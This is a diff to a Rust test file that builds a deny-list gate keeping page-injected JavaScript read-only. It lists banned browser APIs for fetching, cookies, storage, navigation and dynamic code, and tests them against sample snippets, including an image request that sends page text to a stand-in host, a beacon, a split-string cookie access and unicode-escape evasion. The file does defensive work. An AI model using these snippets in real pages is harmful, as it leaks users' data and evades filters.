@@ -21577,74 +21577,446 @@ fn page_eval_refuses_no_page_a_failed_eval_and_too_many_reads() {
     );
 }
 
+/// Nomes que um script so-leitura nunca usa, lidos ou chamados: o
+/// identificador inteiro (`hasFocus` nao e `focus`, `scrollTop` nao e
+/// `scroll`), por o que fazem.
+const READ_ONLY_BANNED_NAMES: &[(&str, &[&str])] = &[
+    (
+        "publica",
+        &[
+            "postMessage",
+            "webview",
+            "__NEURALIA_CAP__",
+            "BroadcastChannel",
+            "MessageChannel",
+        ],
+    ),
+    (
+        "busca",
+        &[
+            "fetch",
+            "XMLHttpRequest",
+            "sendBeacon",
+            "WebSocket",
+            "EventSource",
+            "RTCPeerConnection",
+            "Image",
+            "Audio",
+            "Worker",
+            "SharedWorker",
+            "importScripts",
+            "open",
+        ],
+    ),
+    (
+        "muda o DOM",
+        &[
+            "createElement",
+            "createElementNS",
+            "DOMParser",
+            "createContextualFragment",
+            "setAttribute",
+            "setAttributeNS",
+            "toggleAttribute",
+            "appendChild",
+            "insertBefore",
+            "replaceChild",
+            "replaceWith",
+            "replaceChildren",
+            "insertAdjacentElement",
+            "attachShadow",
+            "adoptNode",
+            "importNode",
+        ],
+    ),
+    (
+        "escreve HTML",
+        &[
+            "innerHTML",
+            "insertAdjacentHTML",
+            "setHTMLUnsafe",
+            "write",
+            "writeln",
+        ],
+    ),
+    (
+        "escuta",
+        &[
+            "addEventListener",
+            "MutationObserver",
+            "IntersectionObserver",
+            "ResizeObserver",
+            "PerformanceObserver",
+        ],
+    ),
+    (
+        "agenda",
+        &[
+            "setTimeout",
+            "setInterval",
+            "setImmediate",
+            "requestAnimationFrame",
+            "requestIdleCallback",
+            "queueMicrotask",
+        ],
+    ),
+    (
+        "navega",
+        &["history", "navigation", "navigate", "reload", "opener"],
+    ),
+    (
+        "age pelo utilizador",
+        &[
+            "submit",
+            "requestSubmit",
+            "click",
+            "dispatchEvent",
+            "focus",
+            "blur",
+            "scroll",
+            "scrollTo",
+            "scrollBy",
+            "scrollIntoView",
+            "scrollIntoViewIfNeeded",
+            "requestFullscreen",
+            "webkitRequestFullscreen",
+            "requestPointerLock",
+            "print",
+            "execCommand",
+            "showModal",
+            "showPopover",
+            "alert",
+            "confirm",
+            "prompt",
+            "share",
+            "close",
+            "getUserMedia",
+            "getDisplayMedia",
+            "Notification",
+        ],
+    ),
+    (
+        "guarda",
+        &[
+            "localStorage",
+            "sessionStorage",
+            "indexedDB",
+            "caches",
+            "cookie",
+            "cookieStore",
+            "clipboard",
+        ],
+    ),
+    (
+        "codigo dinamico",
+        &["eval", "Function", "import", "constructor"],
+    ),
+];
+
+/// Metodos cujo nome sozinho e comum demais para ir em
+/// `READ_ONLY_BANNED_NAMES`: so a chamada `.nome(`.
+const READ_ONLY_BANNED_CALLS: &[&str] = &[
+    "select", "append", "prepend", "before", "after", "remove", "show", "play", "pause", "load",
+    "reset",
+];
+
+/// As partes de `location` que se leem; tudo o resto (`reload`, `assign`,
+/// `location` sozinho, um alias) conta como navegar.
+const LOCATION_READS: &[&str] = &[
+    "href", "origin", "protocol", "host", "hostname", "port", "pathname", "search", "hash",
+];
+
+/// Propriedades cuja atribuicao busca, navega, submete, rola ou escreve HTML.
+const READ_ONLY_BANNED_ASSIGNMENTS: &[&str] = &[
+    "src",
+    "srcset",
+    "srcdoc",
+    "href",
+    "action",
+    "formAction",
+    "target",
+    "poster",
+    "outerHTML",
+    "domain",
+    "name",
+    "value",
+    "scrollTop",
+    "scrollLeft",
+];
+
+/// Objetos globais: atribuir a qualquer propriedade deles nao e ler.
+const READ_ONLY_GLOBALS: &[&str] = &[
+    "window",
+    "document",
+    "self",
+    "globalThis",
+    "top",
+    "parent",
+    "frames",
+    "navigator",
+];
+
+fn is_js_ident(c: char) -> bool {
+    c.is_alphanumeric() || c == '_' || c == '$'
+}
+
+/// Os escapes `\uXXXX` e `\u{...}` desfeitos: `loc\u0061tion` e
+/// `location` para o JavaScript, e tem de o ser para o gate.
+fn decode_js_unicode_escapes(source: &str) -> String {
+    let mut out = String::with_capacity(source.len());
+    let mut rest = source;
+    while let Some(at) = rest.find("\\u") {
+        out.push_str(&rest[..at]);
+        let tail = &rest[at + 2..];
+        let (hex, used) = match tail.strip_prefix('{') {
+            Some(braced) => match braced.find('}') {
+                Some(end) => (&braced[..end], end + 2),
+                None => ("", 0),
+            },
+            None => (tail.get(..4).unwrap_or(""), 4),
+        };
+        let decoded = Some(hex)
+            .filter(|hex| !hex.is_empty() && hex.bytes().all(|b| b.is_ascii_hexdigit()))
+            .and_then(|hex| u32::from_str_radix(hex, 16).ok())
+            .and_then(char::from_u32);
+        match decoded {
+            Some(c) => {
+                out.push(c);
+                rest = &tail[used..];
+            }
+            None => {
+                out.push_str("\\u");
+                rest = tail;
+            }
+        }
+    }
+    out.push_str(rest);
+    out
+}
+
+/// O script sem espacos, menos um entre dois identificadores: `return
+/// history.back()` fica `return history.back()` (tirar tudo dava
+/// `returnhistory`, e o nome escapava), `location . href = x` fica
+/// `location.href=x`.
+fn js_compact(source: &str) -> String {
+    let mut out = String::with_capacity(source.len());
+    let mut gap = false;
+    for c in decode_js_unicode_escapes(source).chars() {
+        if c.is_whitespace() {
+            gap = true;
+            continue;
+        }
+        if gap && is_js_ident(c) && out.chars().next_back().is_some_and(is_js_ident) {
+            out.push(' ');
+        }
+        gap = false;
+        out.push(c);
+    }
+    out
+}
+
+/// Onde `name` aparece como identificador inteiro.
+fn js_words<'a>(code: &'a str, name: &'a str) -> impl Iterator<Item = usize> + 'a {
+    code.match_indices(name)
+        .map(|(at, _)| at)
+        .filter(move |&at| {
+            !code[..at].chars().next_back().is_some_and(is_js_ident)
+                && !code[at + name.len()..]
+                    .chars()
+                    .next()
+                    .is_some_and(is_js_ident)
+        })
+}
+
+/// O identificador que comeca em `rest`.
+fn js_ident_prefix(rest: &str) -> &str {
+    &rest[..rest.find(|c| !is_js_ident(c)).unwrap_or(rest.len())]
+}
+
+/// Se `rest` comeca por uma atribuicao (`=`, `+=`, `++`, ...), nao por uma
+/// comparacao.
+fn is_js_assignment(rest: &str) -> bool {
+    const COMPOUND: &[&str] = &[
+        "+=", "-=", "*=", "/=", "%=", "&=", "|=", "^=", "<<=", ">>=", ">>>=", "**=", "&&=", "||=",
+        "??=", "++", "--",
+    ];
+    (rest.starts_with('=') && !rest.starts_with("=="))
+        || COMPOUND.iter().any(|op| rest.starts_with(op))
+}
+
+/// O que o gate de so-leitura recusa num script. E uma lista de negacao
+/// sobre o texto (§4.3: so proibe presencas), nao uma prova semantica: cobre
+/// as formas diretas de cada efeito, e um script novo entra na mesma com o
+/// sim do dono (OQ2). "So-leitura" e o do plano: `nodeValue` de um no de
+/// texto (a Traducao) e permitido.
+fn read_only_violations(source: &str) -> Vec<String> {
+    let code = js_compact(source);
+    let mut found = Vec::new();
+    for (effect, names) in READ_ONLY_BANNED_NAMES {
+        for name in *names {
+            if js_words(&code, name).next().is_some() {
+                found.push(format!("{effect}: {name}"));
+            }
+        }
+    }
+    for method in READ_ONLY_BANNED_CALLS {
+        if code.contains(&format!(".{method}(")) {
+            found.push(format!("age pelo utilizador: .{method}("));
+        }
+    }
+    // `x['nome']`: uma chave de texto esconde qualquer nome das listas.
+    for key in ["['", "[\"", "[`"] {
+        if code.contains(key) {
+            found.push(format!("chave calculada: {key}"));
+        }
+    }
+    for at in js_words(&code, "location") {
+        let rest = &code[at + "location".len()..];
+        let part = rest.strip_prefix('.').map(js_ident_prefix);
+        let read = part.is_some_and(|part| {
+            LOCATION_READS.contains(&part) && !is_js_assignment(&rest[1 + part.len()..])
+        });
+        if !read {
+            let shown: String = rest.chars().take(24).collect();
+            found.push(format!("navega: location{shown}"));
+        }
+    }
+    for (at, _) in code.match_indices('.') {
+        let property = js_ident_prefix(&code[at + 1..]);
+        if property.is_empty() || !is_js_assignment(&code[at + 1 + property.len()..]) {
+            continue;
+        }
+        let start = code[..at]
+            .char_indices()
+            .rev()
+            .find(|(_, c)| !is_js_ident(*c))
+            .map_or(0, |(before, c)| before + c.len_utf8());
+        let base = &code[start..at];
+        let handler = property.len() > 2 && property.starts_with("on");
+        if handler
+            || READ_ONLY_BANNED_ASSIGNMENTS.contains(&property)
+            || READ_ONLY_GLOBALS.contains(&base)
+        {
+            found.push(format!("atribui: {base}.{property}"));
+        }
+    }
+    found
+}
+
 /// Gate de ausencia (§4.3): nenhum script de `READ_ONLY_SCRIPTS` publica,
-/// busca, escuta, agenda, navega, guarda, escreve HTML ou toca na
-/// capability. "So-leitura" e o do plano: nada disto; `nodeValue` de um no
-/// de texto (a Traducao) e permitido.
+/// busca, muda o DOM, escreve HTML, escuta, agenda, navega, age pelo
+/// utilizador (submeter, clicar, foco, rolagem, janelas), guarda, corre
+/// codigo dinamico ou toca na capability -- a lista de
+/// `read_only_violations`, que `page_eval_read_only_gate_refuses_acting_scripts`
+/// prova forma a forma.
 #[test]
 fn page_eval_scripts_are_read_only() {
     assert!(!READ_ONLY_SCRIPTS.is_empty());
     let mut names = std::collections::HashSet::new();
     for script in READ_ONLY_SCRIPTS {
         assert!(names.insert(script.name()), "{} twice", script.name());
-        let compact: String = script
-            .source()
-            .chars()
-            .filter(|c| !c.is_whitespace())
-            .collect();
-        for forbidden in [
-            "postMessage",
-            "chrome.webview",
-            "__NEURALIA_CAP__",
-            "fetch(",
-            "XMLHttpRequest",
-            "sendBeacon",
-            "WebSocket",
-            "EventSource",
-            "addEventListener",
-            "MutationObserver",
-            "setTimeout",
-            "setInterval",
-            "requestAnimationFrame",
-            "innerHTML",
-            "outerHTML=",
-            "insertAdjacentHTML",
-            "document.write",
-            "eval(",
-            "Function(",
-            "import(",
-            "location=",
-            "location.href=",
-            "location.assign",
-            "location.replace",
-            "window.open",
-            ".submit(",
-            ".click(",
-            "localStorage",
-            "sessionStorage",
-            "indexedDB",
-            "document.cookie",
-            "navigator.clipboard",
-        ] {
-            assert!(
-                !compact.contains(forbidden),
-                "{}: a read-only script uses {forbidden}",
-                script.name()
-            );
-        }
-        // Nenhum `onxxx = ...` (um ouvinte por atribuicao).
-        let bytes = compact.as_bytes();
-        for (at, _) in compact.match_indices(".on") {
-            let name: String = compact[at + 3..]
-                .chars()
-                .take_while(|c| c.is_ascii_alphabetic())
-                .collect();
-            let after = at + 3 + name.len();
-            assert!(
-                name.is_empty() || bytes.get(after) != Some(&b'='),
-                "{}: a read-only script sets .on{name}",
-                script.name()
-            );
-        }
+        let violations = read_only_violations(script.source());
+        assert!(
+            violations.is_empty(),
+            "{}: a read-only script acts on the page: {violations:?}",
+            script.name()
+        );
+    }
+}
+
+/// O gate de cima fica vermelho com cada forma de agir sobre a pagina --
+/// as da revisao primeiro (recarregar, `history`, `location.search=`,
+/// `requestSubmit`, `focus`) -- e verde com as leituras que os leitores
+/// vao precisar.
+#[test]
+fn page_eval_read_only_gate_refuses_acting_scripts() {
+    let acting = [
+        "location.reload()",
+        "history.go(-1)",
+        "location.search = '?x=1'",
+        "document.forms[0].requestSubmit()",
+        "document.querySelector('input').focus()",
+        "return location.reload()",
+        "return history.back()",
+        "location.hash += 'x'",
+        "window.location = 'https://exemplo.test/'",
+        "document.location.href = '/x'",
+        "var l = location; l.assign('/x')",
+        "location.replace('/x')",
+        "loc\\u0061tion.search = 'x'",
+        "\\u{66}etch('/x')",
+        "navigation.navigate('/x')",
+        "window.open('/x')",
+        "document.forms[0].submit()",
+        "var f = document.forms[0]; f.submit.call(f)",
+        "document.links[0].click()",
+        "el.dispatchEvent(new Event('input'))",
+        "document.activeElement.blur()",
+        "document.getElementById('q').select()",
+        "document.body.scrollIntoView()",
+        "window.scrollTo(0, 0)",
+        "document.scrollingElement.scrollTop = 0",
+        "document.documentElement.requestFullscreen()",
+        "window.print()",
+        "document.execCommand('copy')",
+        "window.name = 'segredo'",
+        "document.title = 'x'",
+        "new Image().src = 'https://exemplo.test/?d=' + text",
+        "document.body.appendChild(document.createElement('img'))",
+        "el.setAttribute('href', '/x')",
+        "el.innerHTML = '<b>x</b>'",
+        "el.outerHTML = ''",
+        "document.write('x')",
+        "fetch('/x')",
+        "navigator.sendBeacon('/x', text)",
+        "window.chrome.webview.postMessage('x')",
+        "window.__NEURALIA_CAP__",
+        "el.onclick = function () {}",
+        "document.addEventListener('x', f)",
+        "setTimeout(f, 1)",
+        "localStorage.x = 1",
+        "document['coo' + 'kie']",
+        "eval('1')",
+        "''.constructor.constructor('return 1')()",
+        "import('/x.js')",
+    ];
+    let wrap = |body: &str| format!("(function () {{ var text = ''; {body}; return 1; }})()");
+    // Controlo: o involucro sozinho passa, por isso o vermelho e do corpo.
+    assert_eq!(
+        read_only_violations(&wrap("var x = text.length")),
+        Vec::<String>::new()
+    );
+    for body in acting {
+        assert!(
+            !read_only_violations(&wrap(body)).is_empty(),
+            "the read-only gate lets through: {body}"
+        );
+    }
+
+    let reading = [
+        NOTE_CAPTURE_SCRIPT,
+        r#"(function () {
+  var nodes = document.querySelectorAll('p, h1, li');
+  var out = [];
+  for (var i = 0; i < nodes.length && i < 200; i++) {
+    out.push(String(nodes[i].textContent || '').slice(0, 500));
+  }
+  var box = document.body.getBoundingClientRect();
+  var first = document.images.length ? document.images[0].src : '';
+  return {
+    url: location.href, host: location.hostname, hashed: location.hash === '#a',
+    focused: document.hasFocus(), top: box.top, scrollY: window.scrollY,
+    title: document.title, lang: document.documentElement.lang, first: first, text: out
+  };
+})()"#,
+        // A Traducao troca o texto de um no de texto.
+        "(function () { var walker = document.createTreeWalker(document.body, 4); var node = walker.nextNode(); if (node) { node.nodeValue = 'traduzido'; } return 1; })()",
+    ];
+    for script in reading {
+        let violations = read_only_violations(script);
+        assert!(
+            violations.is_empty(),
+            "a reading script is refused: {violations:?}\n{script}"
+        );
     }
 }
